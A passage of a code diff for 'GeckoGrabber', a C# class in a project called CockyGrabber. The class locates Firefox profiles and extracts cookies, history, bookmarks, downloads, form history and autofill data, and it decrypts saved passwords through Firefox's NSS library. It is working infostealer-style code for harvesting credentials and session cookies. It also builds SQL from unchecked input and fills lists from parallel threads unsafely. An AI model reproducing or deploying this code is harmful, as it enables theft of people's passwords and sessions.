@@ -5,32 +5,40 @@ using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Text.RegularExpressions;
+using System.Threading.Tasks;
 using System.Web.Script.Serialization;
 
 namespace CockyGrabber.Grabbers
 {
     public class GeckoGrabber
     {
-        private const string CookieCommandText = "SELECT id,originAttributes,name,value,host,path,expiry,lastAccessed,creationTime,isSecure,isHttpOnly,inBrowserElement,sameSite,rawSameSite,schemeMap FROM moz_cookies";
-        private const string HistoryCommandText = "SELECT id,url,title,rev_host,visit_count,hidden,typed,frecency,last_visit_date,guid,foreign_count,url_hash,description,preview_image_url,origin_id,site_name FROM moz_places";
-        private const string BookmarkCommandText = "SELECT id,type,fk,parent,position,title,keyword_id,folder_type,dateAdded,lastModified,guid,syncStatus,syncChangeCounter FROM moz_bookmarks";
-        private const string DownloadCommandText = "SELECT id,place_id,anno_attribute_id,content,flags,expiration,type,dateAdded,lastModified FROM moz_annos";
-        public virtual string ProfilesPath { get; set; }
-        public string[] Profiles { get; private set; }
-        private const string CookiesPath = "\\cookies.sqlite";
-        private const string LoginsPath = "\\logins.json";
+        private const string CookieQuery = "SELECT id,originAttributes,name,value,host,path,expiry,lastAccessed,creationTime,isSecure,isHttpOnly,inBrowserElement,sameSite,rawSameSite,schemeMap FROM moz_cookies";
+        private const string HistoryQuery = "SELECT id,url,title,rev_host,visit_count,hidden,typed,frecency,last_visit_date,guid,foreign_count,url_hash,description,preview_image_url,origin_id,site_name FROM moz_places";
+        private const string BookmarkQuery = "SELECT id,type,fk,parent,position,title,keyword_id,folder_type,dateAdded,lastModified,guid,syncStatus,syncChangeCounter FROM moz_bookmarks";
+        private const string DownloadQuery = "SELECT id,place_id,anno_attribute_id,content,flags,expiration,type,dateAdded,lastModified FROM moz_annos";
+        private const string FormHistoryQuery = "SELECT id,fieldname,value,timesUsed,firstUsed,lastUsed,guid FROM moz_formhistory";
+        private const string CookiePath = "\\cookies.sqlite";
+        private const string LoginPath = "\\logins.json";
         private const string PlacesPath = "\\places.sqlite";
+        private const string FormHistoryPath = "\\formhistory.sqlite";
+        private const string AutoFillProfilesPath = "\\autofill-profiles.json";
+        public virtual string ProfileDirPath { get; set; }
 
         private readonly JavaScriptSerializer JSON_Serializer = new JavaScriptSerializer();
+        private readonly IEnumerable<string> _profiles;
+        public string[] Profiles
+        {
+            get => _profiles.ToArray();
+        }
 
         public GeckoGrabber()
         {
-            // Check if all profiles exist:
-            if (!Directory.Exists(ProfilesPath))
-                throw new GrabberException(GrabberError.ProfileNotFound, $"Gecko profile path was not found: {ProfilesPath}");
-
-            // Store all valid gecko profiles:
-            Profiles = Directory.GetDirectories(ProfilesPath).Where(str => File.Exists(str + CookiesPath) && File.Exists(str + "\\logins.json")).ToArray();
+            // Check if the profile directory exists:
+            if (!Directory.Exists(ProfileDirPath))
+                throw new GrabberException(GrabberError.ProfilesNotFound, $"The gecko profile directory couldn't be found: {ProfileDirPath}");
+            
+            // Get all profile paths:
+            _profiles = Directory.GetDirectories(ProfileDirPath);
             
             JSON_Serializer.RegisterConverters(new[] { new DynamicJsonConverter() }); // Register DynamicJsonConverter for dynamic JSON (De)Serialisation
         }
@@ -57,39 +65,130 @@ namespace CockyGrabber.Grabbers
         private string GetTempFilePath() => Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString()); // This is better than Path.GetTempFileName() because GetTempFileName is most of the time inaccurate
 
         /// <summary>
-        /// Returns a value depending on if the database of a specific profile with the stored cookies was found
+        /// Returns a value depending on if the database with the stored cookies was found on a specific browser profile.
         /// </summary>
-        /// <param name="profilePath">Path to the gecko profile</param>
-        /// <returns>True if the cookies exist</returns>
-        public bool CookiesExist(string profilePath) => File.Exists(profilePath + CookiesPath);
+        /// <param name="profile">The path to the browser profile directory.</param>
+        /// <returns>True if the cookies exist.</returns>
+        public bool CookiesExist(string profile) => File.Exists(profile + CookiePath);
+        /// <summary>
+        /// Returns a value depending on if any databases with stored cookies were found (on any profile; given that profiles are supported on the browser).
+        /// </summary>
+        /// <returns>True if the cookies exist.</returns>
+        public bool AnyCookiesExist()
+        {
+            foreach (string profile in _profiles)
+                if (CookiesExist(profile)) return true;
+            return false;
+        }
 
         /// <summary>
-        /// Returns a value depending on if the database of a specific profile with the stored logins was found
+        /// Returns a value depending on if the database with the stored logins was found on a specific browser profile.
         /// </summary>
-        /// <param name="profilePath">Path to the gecko profile</param>
-        /// <returns>True if the logins exist</returns>
-        public bool LoginsExist(string profilePath) => File.Exists(profilePath + LoginsPath);
+        /// <param name="profile">The path to the browser profile directory.</param>
+        /// <returns>True if the logins exist.</returns>
+        public bool LoginsExist(string profile) => File.Exists(profile + LoginPath);
+        /// <summary>
+        /// Returns a value depending on if any databases with stored logins were found (on any profile; given that profiles are supported on the browser).
+        /// </summary>
+        /// <returns>True if the logins exist.</returns>
+        public bool AnyLoginsExist()
+        {
+            foreach (string profile in _profiles)
+                if (LoginsExist(profile)) return true;
+            return false;
+        }
 
         /// <summary>
-        /// Returns a value depending on if the database with the stored browser history was found
+        /// Returns a value depending on if the database with the stored browser history was found on a specific browser profile.
         /// </summary>
-        /// <param name="profilePath">Path to the gecko profile</param>
-        /// <returns>True if the history exist</returns>
-        public bool HistoryExist(string profilePath) => File.Exists(profilePath + PlacesPath);
+        /// <param name="profile">The path to the browser profile directory.</param>
+        /// <returns>True if the history exist.</returns>
+        public bool HistoryExists(string profile) => File.Exists(profile + PlacesPath);
+        /// <summary>
+        /// Returns a value depending on if any databases with stored browser history were found (on any profile; given that profiles are supported on the browser).
+        /// </summary>
+        /// <returns>True if the history exist.</returns>
+        public bool AnyHistoryExists()
+        {
+            foreach (string profile in _profiles)
+                if (HistoryExists(profile)) return true;
+            return false;
+        }
 
         /// <summary>
-        /// Returns a value depending on if the database with the bookmarks was found
+        /// Returns a value depending on if the database with the stored browser bookmarks was found on a specific browser profile.
         /// </summary>
-        /// <param name="profilePath">Path to the gecko profile</param>
-        /// <returns>True if the bookmarks exist</returns>
-        public bool BookmarksExist(string profilePath) => File.Exists(profilePath + PlacesPath);
+        /// <param name="profile">The path to the browser profile directory.</param>
+        /// <returns>True if the bookmarks exist.</returns>
+        public bool BookmarksExist(string profile) => File.Exists(profile + PlacesPath);
+        /// <summary>
+        /// Returns a value depending on if any databases with stored browser bookmarks were found (on any profile; given that profiles are supported on the browser).
+        /// </summary>
+        /// <returns>True if the bookmarks exist.</returns>
+        public bool AnyBookmarksExist()
+        {
+            foreach (string profile in _profiles)
+                if (BookmarksExist(profile)) return true;
+            return false;
+        }
 
         /// <summary>
-        /// Returns a value depending on if the database with the downloads was found
+        /// Returns a value depending on if the database with the stored downloads was found on a specific browser profile.
         /// </summary>
-        /// <param name="profilePath">Path to the gecko profile</param>
-        /// <returns>True if stored downloads exist</returns>
-        public bool DownloadsExist(string profilePath) => File.Exists(profilePath + PlacesPath);
+        /// <param name="profile">The path to the browser profile directory.</param>
+        /// <returns>True if the downloads exist.</returns>
+        public bool DownloadsExist(string profile) => File.Exists(profile + PlacesPath);
+        /// <summary>
+        /// Returns a value depending on if any databases with stored downloads were found (on any profile; given that profiles are supported on the browser).
+        /// </summary>
+        /// <returns>True if the downloads exist.</returns>
+        public bool AnyDownloadsExist()
+        {
+            foreach (string profile in _profiles)
+                if (DownloadsExist(profile)) return true;
+            return false;
+        }
+
+        /// <summary>
+        /// Returns a value depending on if the database with the stored form history was found on a specific browser profile.
+        /// </summary>
+        /// <param name="profile">The path to the browser profile directory.</param>
+        /// <returns>True if the form history database exist.</returns>
+        public bool FormHistoryExists(string profile) => File.Exists(profile + FormHistoryPath);
+        /// <summary>
+        /// Returns a value depending on if any databases with stored form history were found (on any profile; given that profiles are supported on the browser).
+        /// </summary>
+        /// <returns>True if the form history database exist.</returns>
+        public bool AnyFormHistoryExists()
+        {
+            foreach (string profile in _profiles)
+                if (FormHistoryExists(profile)) return true;
+            return false;
+        }
+
+        /// <summary>
+        /// Returns a value depending on if the file called "autofill-profiles.json" was found on a specific browser profile.
+        /// </summary>
+        /// <param name="profile">The path to the browser profile directory.</param>
+        /// <returns>True if the file exist.</returns>
+        public bool AutoFillProfilesExists(string profile) => File.Exists(profile + AutoFillProfilesPath);
+        /// <summary>
+        /// Returns a value depending on if any files called "autofill-profiles.json" were found (on any profile; given that profiles are supported on the browser).
+        /// </summary>
+        /// <returns>True if the file exist.</returns>
+        public bool AnyAutoFillProfilesExists()
+        {
+            foreach (string profile in _profiles)
+                if (AutoFillProfilesExists(profile)) return true;
+            return false;
+        }
+
+        /// <summary>
+        /// Returns a value depending on if all files relevant for the gathering of data that store any type of browser information exist.
+        /// </summary>
+        /// <returns>True if the file with the key exist.</returns>
+        public bool EverythingExists() => AnyCookiesExist() && AnyLoginsExist() && AnyHistoryExists() && AnyBookmarksExist() && AnyDownloadsExist() && AnyFormHistoryExists() && AnyAutoFillProfilesExists();
+
         #endregion
 
         #region GetCookies()
@@ -97,17 +196,19 @@ namespace CockyGrabber.Grabbers
         {
             List<Gecko.Cookie> cookies = new List<Gecko.Cookie>();
             if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
-            foreach (string profile in Profiles)
+            if (!AnyCookiesExist()) throw new GrabberException(GrabberError.CookiesNotFound, $"No cookies were found!"); // Throw an Exception if no cookies were found
+
+            Parallel.ForEach(_profiles, (profile) =>
             {
-                if (!LoginsExist(profile)) throw new GrabberException(GrabberError.CookiesNotFound, $"The Cookie database could not be found: {CookieCommandText}"); // throw a Exception if the Cookie DB was not found
+                if (!CookiesExist(profile)) return;
 
                 // Copy the database to a temporary location because it could be already in use
-                string tempFile = CopyToTempFile(profile + CookiesPath);
+                string tempFile = CopyToTempFile(profile + CookiePath);
 
                 using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                 using (var cmd = conn.CreateCommand())
                 {
-                    cmd.CommandText = $"{CookieCommandText} WHERE {by} = '{value}'";
+                    cmd.CommandText = $"{CookieQuery} WHERE {by} = '{value}'";
 
                     conn.Open();
                     using (var reader = cmd.ExecuteReader())
@@ -122,13 +223,13 @@ namespace CockyGrabber.Grabbers
                                 Value = reader.GetString(3),
                                 Host = reader.GetString(4),
                                 Path = reader.GetString(5),
-                                Expiry = UnixTimeInSecondsToDate(reader.GetInt64(6)),
-                                LastAccessed = UnixTimeInMicrosecondsToDate(reader.GetInt64(7)),
-                                CreationTime = UnixTimeInMicrosecondsToDate(reader.GetInt64(8)),
+                                Expiry = Time.FromUnixTimeSeconds(reader.GetInt64(6)),
+                                LastAccessed = Time.FromUnixTimeMicroseconds(reader.GetInt64(7)),
+                                CreationTime = Time.FromUnixTimeMicroseconds(reader.GetInt64(8)),
                                 IsSecure = reader.GetBoolean(9),
                                 IsHttpOnly = reader.GetBoolean(10),
                                 InBrowserElement = reader.GetBoolean(11),
-                                SameSite = reader.GetInt16(12),
+                                SameSite = (Gecko.Cookie.SameSiteType)reader.GetInt16(12),
                                 RawSameSite = reader.GetInt16(13),
                                 SchemeMap = reader.GetInt16(14),
                             });
@@ -137,24 +238,27 @@ namespace CockyGrabber.Grabbers
                     conn.Dispose();
                 }
                 File.Delete(tempFile);
-            }
+            });
+
             return cookies;
         }
 
         public IEnumerable<Gecko.Cookie> GetCookies()
         {
             List<Gecko.Cookie> cookies = new List<Gecko.Cookie>();
-            foreach (string profile in Profiles)
+            if (!AnyCookiesExist()) throw new GrabberException(GrabberError.CookiesNotFound, $"No cookie databases were found!"); // Throw an Exception if no cookie DBs were found
+
+            Parallel.ForEach(_profiles, (profile) =>
             {
-                if (!CookiesExist(profile)) throw new GrabberException(GrabberError.CookiesNotFound, $"The Cookie database could not be found: {CookieCommandText}"); // throw a Exception if the Cookie DB was not found
+                if (!CookiesExist(profile)) return;
 
                 // Copy the database to a temporary location because it could be already in use
-                string tempFile = CopyToTempFile(profile + CookiesPath);
+                string tempFile = CopyToTempFile(profile + CookiePath);
 
                 using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                 using (var cmd = conn.CreateCommand())
                 {
-                    cmd.CommandText = CookieCommandText;
+                    cmd.CommandText = CookieQuery;
 
                     conn.Open();
                     using (var reader = cmd.ExecuteReader())
@@ -169,13 +273,13 @@ namespace CockyGrabber.Grabbers
                                 Value = reader.GetString(3),
                                 Host = reader.GetString(4),
                                 Path = reader.GetString(5),
-                                Expiry = UnixTimeInSecondsToDate(reader.GetInt64(6) * 1000),
-                                LastAccessed = UnixTimeInMicrosecondsToDate(reader.GetInt64(7)),
-                                CreationTime = UnixTimeInMicrosecondsToDate(reader.GetInt64(8)),
+                                Expiry = Time.FromUnixTimeSeconds(reader.GetInt64(6)),
+                                LastAccessed = Time.FromUnixTimeMicroseconds(reader.GetInt64(7)),
+                                CreationTime = Time.FromUnixTimeMicroseconds(reader.GetInt64(8)),
                                 IsSecure = reader.GetBoolean(9),
                                 IsHttpOnly = reader.GetBoolean(10),
                                 InBrowserElement = reader.GetBoolean(11),
-                                SameSite = reader.GetInt16(12),
+                                SameSite = (Gecko.Cookie.SameSiteType)reader.GetInt16(12),
                                 RawSameSite = reader.GetInt16(13),
                                 SchemeMap = reader.GetInt16(14),
                             });
@@ -184,7 +288,8 @@ namespace CockyGrabber.Grabbers
                     conn.Dispose();
                 }
                 File.Delete(tempFile);
-            }
+            });
+
             return cookies;
         }
         #endregion
@@ -214,9 +319,9 @@ namespace CockyGrabber.Grabbers
                     DecryptedPassword = GeckoDecryptor.DecryptValue((string)obj.encryptedPassword),
                     Guid = (string)obj.guid,
                     EncType = (short)obj.encType,
-                    TimeCreated = UnixTimeInMillisecondsToDate((long)obj.timeCreated),
-                    TimeLastUsed = UnixTimeInMillisecondsToDate((long)obj.timeLastUsed),
-                    TimePasswordChanged = UnixTimeInMillisecondsToDate((long)obj.timePasswordChanged),
+                    TimeCreated = Time.FromUnixTimeMilliseconds((long)obj.timeCreated),
+                    TimeLastUsed = Time.FromUnixTimeMilliseconds((long)obj.timeLastUsed),
+                    TimePasswordChanged = Time.FromUnixTimeMilliseconds((long)obj.timePasswordChanged),
                     TimesUsed = (uint)obj.timesUsed,
                 });
             }
@@ -226,20 +331,23 @@ namespace CockyGrabber.Grabbers
         public IEnumerable<Gecko.Login> GetLogins()
         {
             List<Gecko.Login> logins = new List<Gecko.Login>();
+            if (!AnyLoginsExist()) throw new GrabberException(GrabberError.LoginsNotFound, $"No login files were found!"); // Throw an Exception if no logins were found
 
             // Get ProgramFiles Path:
             string programFiles = Environment.GetEnvironmentVariable("ProgramW6432");
             if (string.IsNullOrEmpty(programFiles))
                 programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
 
-            GeckoDecryptor.LoadNSS(programFiles + @"\Mozilla Firefox"); // Load NSS
-            foreach (string profile in Profiles)
+            // Load NSS:
+            if (!GeckoDecryptor.LoadNSS(programFiles + @"\Mozilla Firefox")) throw new GrabberException(GrabberError.Nss3NotFound, "NSS3 couldn't be loaded!"); // Throw an exception if NSS3 couldn't be loaded
+
+            foreach (string profile in _profiles)
             {
-                if (!LoginsExist(profile)) throw new GrabberException(GrabberError.LoginsNotFound, $"The Login File could not be found: {LoginsPath}"); // throw an Exception if the Login File was not found
+                if (!LoginsExist(profile)) continue;
 
-                if (!GeckoDecryptor.SetProfile(profile)) throw new GrabberException(GrabberError.CouldNotSetProfile, $"Profile could not be set: {profile}"); // throw an Exception if the firefox profile couldn't be set
+                if (!GeckoDecryptor.SetProfile(profile)) throw new GrabberException(GrabberError.CouldNotSetProfile, $"Profile could not be set: {profile}"); // Throw an Exception if the firefox profile couldn't be set
 
-                dynamic json = JSON_Serializer.Deserialize(File.ReadAllText(profile + LoginsPath), typeof(object));
+                dynamic json = JSON_Serializer.Deserialize(File.ReadAllText(profile + LoginPath), typeof(object));
                 List<Gecko.Login> _logins = ConvertDynamicObjectsToLogins(json.logins);
                 logins.AddRange(_logins);
             }
@@ -250,21 +358,24 @@ namespace CockyGrabber.Grabbers
         public IEnumerable<Gecko.Login> GetLoginsBy(Gecko.Login.Header by, object value)
         {
             List<Gecko.Login> logins = new List<Gecko.Login>();
-            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
+            if (value == null) throw new ArgumentNullException("value"); // Throw a ArgumentNullException if value was not defined
+            if (!AnyLoginsExist()) throw new GrabberException(GrabberError.LoginsNotFound, $"No login files were found!"); // Throw an Exception if no logins were found
 
             // Get ProgramFiles Path:
             string programFiles = Environment.GetEnvironmentVariable("ProgramW6432");
             if (string.IsNullOrEmpty(programFiles))
                 programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
 
-            GeckoDecryptor.LoadNSS(programFiles + @"\Mozilla Firefox"); // Load NSS
-            foreach (string profile in Profiles)
+            // Load NSS:
+            if (!GeckoDecryptor.LoadNSS(programFiles + @"\Mozilla Firefox")) throw new GrabberException(GrabberError.Nss3NotFound, "NSS3 couldn't be loaded!"); // Throw an exception if NSS3 couldn't be loaded
+
+            foreach (string profile in _profiles)
             {
-                if (!LoginsExist(profile)) throw new GrabberException(GrabberError.LoginsNotFound, $"The Login File could not be found: {LoginsPath}"); // throw a Exception if the Login File was not found
+                if (!LoginsExist(profile)) continue;
 
-                if (!GeckoDecryptor.SetProfile(profile)) throw new GrabberException(GrabberError.CouldNotSetProfile, $"Profile could not be set: {profile}"); // throw an Exception if the firefox profile couldn't be set
+                if (!GeckoDecryptor.SetProfile(profile)) throw new GrabberException(GrabberError.CouldNotSetProfile, $"Profile could not be set: {profile}"); // Throw an Exception if the firefox profile couldn't be set
 
-                dynamic json = JSON_Serializer.Deserialize(File.ReadAllText(profile + LoginsPath), typeof(object));
+                dynamic json = JSON_Serializer.Deserialize(File.ReadAllText(profile + LoginPath), typeof(object));
                 foreach (Gecko.Login l in ConvertDynamicObjectsToLogins(json.logins))
                 {
                     switch (by)
@@ -300,21 +411,21 @@ namespace CockyGrabber.Grabbers
                             if (l.EncType == (short)value) logins.Add(l);
                             break;
                         case Gecko.Login.Header.timeCreated:
-                            if (l.TimeCreated == UnixTimeInMillisecondsToDate((long)value)) logins.Add(l);
+                            if (l.TimeCreated == Time.FromUnixTimeMilliseconds((long)value)) logins.Add(l);
                             break;
                         case Gecko.Login.Header.timeLastUsed:
-                            if (l.TimeLastUsed == UnixTimeInMillisecondsToDate((long)value)) logins.Add(l);
+                            if (l.TimeLastUsed == Time.FromUnixTimeMilliseconds((long)value)) logins.Add(l);
                             break;
                         case Gecko.Login.Header.timePasswordChanged:
-                            if (l.TimePasswordChanged == UnixTimeInMillisecondsToDate((long)value)) logins.Add(l);
+                            if (l.TimePasswordChanged == Time.FromUnixTimeMilliseconds((long)value)) logins.Add(l);
                             break;
                         case Gecko.Login.Header.timesUsed:
                             if (l.TimesUsed == (int)value) logins.Add(l);
                             break;
                     }
                 }
-                GeckoDecryptor.UnLoadNSS(); // Unload NSS
             }
+            GeckoDecryptor.UnLoadNSS(); // Unload NSS
             return logins;
         }
         #endregion
@@ -324,10 +435,11 @@ namespace CockyGrabber.Grabbers
         {
             List<Gecko.Site> history = new List<Gecko.Site>();
             if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
+            if (!AnyHistoryExists()) throw new GrabberException(GrabberError.HistoryNotFound, $"No history databases were found!"); // Throw an Exception if no history DBs were found
 
-            foreach (string profile in Profiles)
+            Parallel.ForEach(_profiles, (profile) =>
             {
-                if (!HistoryExist(profile)) throw new GrabberException(GrabberError.HistoryNotFound, $"The History database could not be found: {profile + PlacesPath}"); // throw a Exception if the History DB was not found
+                if (!HistoryExists(profile)) return;
 
                 // Copy the database to a temporary location because it could be already in use
                 string tempFile = CopyToTempFile(profile + PlacesPath);
@@ -335,7 +447,7 @@ namespace CockyGrabber.Grabbers
                 using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                 using (var cmd = conn.CreateCommand())
                 {
-                    cmd.CommandText = $"{HistoryCommandText} WHERE {by} = '{value}'";
+                    cmd.CommandText = $"{HistoryQuery} WHERE {by} = '{value}'";
 
                     conn.Open();
                     using (var reader = cmd.ExecuteReader())
@@ -352,7 +464,7 @@ namespace CockyGrabber.Grabbers
                                 IsHidden = reader.GetBoolean(5),
                                 IsTyped = reader.GetBoolean(6),
                                 Frecency = reader.GetInt32(7),
-                                LastVisitDate = reader[8].Equals(DBNull.Value) ? DateTimeOffset.MinValue : UnixTimeInMicrosecondsToDate(reader.GetInt64(8)),
+                                LastVisitDate = reader[8].Equals(DBNull.Value) ? DateTimeOffset.MinValue : Time.FromUnixTimeMicroseconds(reader.GetInt64(8)),
                                 Guid = reader.GetString(9),
                                 ForeignCount = reader.GetInt32(10),
                                 UrlHash = reader.GetInt64(11),
@@ -366,17 +478,18 @@ namespace CockyGrabber.Grabbers
                     conn.Dispose();
                 }
                 File.Delete(tempFile);
-            }
+            });
             return history;
         }
 
         public IEnumerable<Gecko.Site> GetHistory()
         {
             List<Gecko.Site> history = new List<Gecko.Site>();
+            if (!AnyHistoryExists()) throw new GrabberException(GrabberError.HistoryNotFound, $"No history databases were found!"); // Throw an Exception if no history DBs were found
 
-            foreach (string profile in Profiles)
+            Parallel.ForEach(_profiles, (profile) =>
             {
-                if (!HistoryExist(profile)) throw new GrabberException(GrabberError.HistoryNotFound, $"The History database could not be found: {profile + PlacesPath}"); // throw a Exception if the History DB was not found
+                if (!HistoryExists(profile)) return;
 
                 // Copy the database to a temporary location because it could be already in use
                 string tempFile = CopyToTempFile(profile + PlacesPath);
@@ -384,7 +497,7 @@ namespace CockyGrabber.Grabbers
                 using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                 using (var cmd = conn.CreateCommand())
                 {
-                    cmd.CommandText = HistoryCommandText;
+                    cmd.CommandText = HistoryQuery;
 
                     conn.Open();
                     using (var reader = cmd.ExecuteReader())
@@ -401,7 +514,7 @@ namespace CockyGrabber.Grabbers
                                 IsHidden = reader.GetBoolean(5),
                                 IsTyped = reader.GetBoolean(6),
                                 Frecency = reader.GetInt32(7),
-                                LastVisitDate = reader[8].Equals(DBNull.Value) ? DateTimeOffset.MinValue : UnixTimeInMicrosecondsToDate(reader.GetInt64(8)),
+                                LastVisitDate = reader[8].Equals(DBNull.Value) ? DateTimeOffset.MinValue : Time.FromUnixTimeMicroseconds(reader.GetInt64(8)),
                                 Guid = reader.GetString(9),
                                 ForeignCount = reader.GetInt32(10),
                                 UrlHash = reader.GetInt64(11),
@@ -415,7 +528,7 @@ namespace CockyGrabber.Grabbers
                     conn.Dispose();
                 }
                 File.Delete(tempFile);
-            }
+            });
             return history;
         }
         #endregion
@@ -425,10 +538,11 @@ namespace CockyGrabber.Grabbers
         {
             List<Gecko.Bookmark> bookmarks = new List<Gecko.Bookmark>();
             if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
+            if (!AnyBookmarksExist()) throw new GrabberException(GrabberError.BookmarksNotFound, $"No bookmark databases were found!"); // Throw an Exception if no bookmark DBs were found
 
-            foreach (string profile in Profiles)
+            Parallel.ForEach(_profiles, (profile) =>
             {
-                if (!BookmarksExist(profile)) throw new GrabberException(GrabberError.BookmarksNotFound, $"The database that stores the Bookmarks could not be found: {profile + PlacesPath}"); // throw a Exception if the Bookmarks DB was not found
+                if (!BookmarksExist(profile)) return;
 
                 // Copy the database to a temporary location because it could be already in use
                 string tempFile = CopyToTempFile(profile + PlacesPath);
@@ -436,7 +550,7 @@ namespace CockyGrabber.Grabbers
                 using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                 using (var cmd = conn.CreateCommand())
                 {
-                    cmd.CommandText = $"{BookmarkCommandText} WHERE {by} = '{value}'";
+                    cmd.CommandText = $"{BookmarkQuery} WHERE {by} = '{value}'";
 
                     conn.Open();
                     using (var reader = cmd.ExecuteReader())
@@ -466,8 +580,8 @@ namespace CockyGrabber.Grabbers
                                     Title = reader[5].Equals(DBNull.Value) ? null : reader.GetString(5),
                                     KeywordId = reader[6].Equals(DBNull.Value) ? 0 : reader.GetInt32(6),
                                     FolderType = reader[7].Equals(DBNull.Value) ? null : reader.GetString(7),
-                                    DateAdded = UnixTimeInMicrosecondsToDate(reader.GetInt64(8)),
-                                    LastModified = UnixTimeInMicrosecondsToDate(reader.GetInt64(9)),
+                                    DateAdded = Time.FromUnixTimeMicroseconds(reader.GetInt64(8)),
+                                    LastModified = Time.FromUnixTimeMicroseconds(reader.GetInt64(9)),
                                     Guid = reader.GetString(10),
                                     SyncStatus = reader.GetInt32(11),
                                     SyncChangeCounter = reader.GetInt32(12),
@@ -480,17 +594,18 @@ namespace CockyGrabber.Grabbers
                     conn.Dispose();
                 }
                 File.Delete(tempFile);
-            }
+            });
             return bookmarks;
         }
 
         public IEnumerable<Gecko.Bookmark> GetBookmarks()
         {
             List<Gecko.Bookmark> bookmarks = new List<Gecko.Bookmark>();
+            if (!AnyBookmarksExist()) throw new GrabberException(GrabberError.BookmarksNotFound, $"No bookmark databases were found!"); // Throw an Exception if no bookmark DBs were found
 
-            foreach (string profile in Profiles)
+            Parallel.ForEach(_profiles, (profile) =>
             {
-                if (!BookmarksExist(profile)) throw new GrabberException(GrabberError.BookmarksNotFound, $"The database that stores the Bookmarks could not be found: {profile + PlacesPath}"); // throw a Exception if the Bookmarks DB was not found
+                if (!BookmarksExist(profile)) return;
 
                 // Copy the database to a temporary location because it could be already in use
                 string tempFile = CopyToTempFile(profile + PlacesPath);
@@ -498,7 +613,7 @@ namespace CockyGrabber.Grabbers
                 using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                 using (var cmd = conn.CreateCommand())
                 {
-                    cmd.CommandText = BookmarkCommandText;
+                    cmd.CommandText = BookmarkQuery;
 
                     conn.Open();
                     using (var reader = cmd.ExecuteReader())
@@ -528,8 +643,8 @@ namespace CockyGrabber.Grabbers
                                     Title = reader[5].Equals(DBNull.Value) ? null : reader.GetString(5),
                                     KeywordId = reader[6].Equals(DBNull.Value) ? 0 : reader.GetInt32(6),
                                     FolderType = reader[7].Equals(DBNull.Value) ? null : reader.GetString(7),
-                                    DateAdded = UnixTimeInMicrosecondsToDate(reader.GetInt64(8)),
-                                    LastModified = UnixTimeInMicrosecondsToDate(reader.GetInt64(9)),
+                                    DateAdded = Time.FromUnixTimeMicroseconds(reader.GetInt64(8)),
+                                    LastModified = Time.FromUnixTimeMicroseconds(reader.GetInt64(9)),
                                     Guid = reader.GetString(10),
                                     SyncStatus = reader.GetInt32(11),
                                     SyncChangeCounter = reader.GetInt32(12),
@@ -542,7 +657,7 @@ namespace CockyGrabber.Grabbers
                     conn.Dispose();
                 }
                 File.Delete(tempFile);
-            }
+            });
             return bookmarks;
         }
         #endregion
@@ -552,10 +667,11 @@ namespace CockyGrabber.Grabbers
         {
             List<Gecko.Download> downloads = new List<Gecko.Download>();
             if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
+            if (!AnyDownloadsExist()) throw new GrabberException(GrabberError.DownloadsNotFound, $"No download databases were found!"); // Throw an Exception if no download DBs were found
 
-            foreach (string profile in Profiles)
+            Parallel.ForEach(_profiles, (profile) =>
             {
-                if (!DownloadsExist(profile)) throw new GrabberException(GrabberError.DownloadsNotFound, $"The database that stores the Downloads could not be found: {profile + PlacesPath}"); // throw a Exception if the Downloads DB was not found
+                if (!DownloadsExist(profile)) return;
 
                 // Copy the database to a temporary location because it could be already in use
                 string tempFile = CopyToTempFile(profile + PlacesPath);
@@ -563,7 +679,7 @@ namespace CockyGrabber.Grabbers
                 using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                 using (var cmd = conn.CreateCommand())
                 {
-                    cmd.CommandText = $"{DownloadCommandText} WHERE {by} = '{value}'";
+                    cmd.CommandText = $"{DownloadQuery} WHERE {by} = '{value}'";
 
                     conn.Open();
                     using (var reader = cmd.ExecuteReader())
@@ -593,7 +709,7 @@ namespace CockyGrabber.Grabbers
 
                                 // Add metadata to the temporary download model:
                                 temp.State = state;
-                                temp.EndTime = UnixTimeInMicrosecondsToDate(endtime);
+                                temp.EndTime = Time.FromUnixTimeMicroseconds(endtime);
                                 temp.FileSize = filesize;
 
                                 downloads.Add(temp); // Add temporary model to list
@@ -616,8 +732,8 @@ namespace CockyGrabber.Grabbers
                                     Flags = reader.GetInt16(4),
                                     Expiration = reader.GetInt32(5),
                                     Type = reader.GetInt16(6),
-                                    DateAdded = UnixTimeInMicrosecondsToDate(reader.GetInt64(7)),
-                                    LastModified = UnixTimeInMicrosecondsToDate(reader.GetInt64(8)),
+                                    DateAdded = Time.FromUnixTimeMicroseconds(reader.GetInt64(7)),
+                                    LastModified = Time.FromUnixTimeMicroseconds(reader.GetInt64(8)),
 
                                     Url = (string)_cmd.ExecuteScalar(),
                                     Filename = content.Substring(content.LastIndexOf('/') + 1), // Get the substring of the last '/'. Example: file:///C:/Users/User/Downloads/File.zip = File.zip
@@ -628,17 +744,18 @@ namespace CockyGrabber.Grabbers
                     conn.Dispose();
                 }
                 File.Delete(tempFile);
-            }
+            });
             return downloads;
         }
 
         public IEnumerable<Gecko.Download> GetDownloads()
         {
             List<Gecko.Download> downloads = new List<Gecko.Download>();
+            if (!AnyDownloadsExist()) throw new GrabberException(GrabberError.DownloadsNotFound, $"No download databases were found!"); // Throw an Exception if no download DBs were found
 
-            foreach (string profile in Profiles)
+            Parallel.ForEach(_profiles, (profile) =>
             {
-                if (!DownloadsExist(profile)) throw new GrabberException(GrabberError.DownloadsNotFound, $"The database that stores the Downloads could not be found: {profile + PlacesPath}"); // throw a Exception if the Downloads DB was not found
